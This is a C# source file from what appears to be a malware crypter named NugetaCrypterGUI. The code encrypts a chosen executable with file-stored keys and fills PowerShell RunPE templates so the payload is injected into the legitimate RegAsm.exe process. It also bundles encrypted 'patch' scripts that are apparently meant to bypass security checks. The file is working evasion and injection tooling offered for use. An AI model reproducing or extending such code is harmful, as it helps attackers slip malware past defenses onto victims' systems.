using System;
using System.IO;
using System.Text;

namespace NugetaCrypterGUI.Randomize
{
    internal class Randomize
    {
        public static byte[] RandomIvKey(int sizeinb)
        {
            Random random = new Random();
            byte[] b = new byte[sizeinb];
            random.NextBytes(b);
            return b;
        }

        public static Tuple<string, string,string,string, byte[],string,string> SourceEncrypt()
        {
            return Tuple.Create<string, string,string,string, byte[],string,string>(
                Convert.ToBase64String(Encrypt.Encrypt.Encryptor(Encoding.UTF8.GetBytes(Files.RunPe), Convert.FromBase64String(File.ReadAllText("Key.txt")), Convert.FromBase64String(File.ReadAllText("Iv.txt")))),
                Convert.ToBase64String(Encrypt.Encrypt.Encryptor(Encoding.UTF8.GetBytes(Files.Patch), Convert.FromBase64String(File.ReadAllText("Key.txt")), Convert.FromBase64String(File.ReadAllText("Iv.txt")))),
                Convert.ToBase64String(Powershell.Encryption.EncryptStringToBytes(Files.PowershellPatch, Convert.FromBase64String(File.ReadAllText("PowershellKey.txt")), Convert.FromBase64String(File.ReadAllText("PowershellIv.txt")))),
                Convert.ToBase64String(Powershell.Encryption.EncryptStringToBytes(Files.PowershellRunPe.Replace("%PATH%", @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe").Replace("%PAYLOADHERE%",Convert.ToBase64String(Encrypt.Encrypt.Encryptor(File.ReadAllBytes(NugetaCrypterGUI.Forms.SubForms.Path.FilePath), Convert.FromBase64String(File.ReadAllText("Key.txt")), Convert.FromBase64String(File.ReadAllText("Iv.txt"))))).Replace("%KEYHERE%",File.ReadAllText("Key.txt")).Replace("%IVHERE%",File.ReadAllText("Iv.txt")), Convert.FromBase64String(File.ReadAllText("PowershellKey.txt")), Convert.FromBase64String(File.ReadAllText("PowershellIv.txt")))),
                Encrypt.Encrypt.Encryptor(File.ReadAllBytes(NugetaCrypterGUI.Forms.SubForms.Path.FilePath), Convert.FromBase64String(File.ReadAllText("Key.txt")), Convert.FromBase64String(File.ReadAllText("Iv.txt"))),
                File.ReadAllText("Key.txt"), 
                File.ReadAllText("Iv.txt"));
        }

        public static string RunPe()
        {
            StringBuilder sb = new StringBuilder();
            sb.Append(Files.PowershellRunPe);
            sb.Replace("%PATH%", @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe");
            sb.Replace("%PAYLOADHERE%", Convert.ToBase64String(SourceEncrypt().Item5));
            return sb.ToString();
        }
    }
}
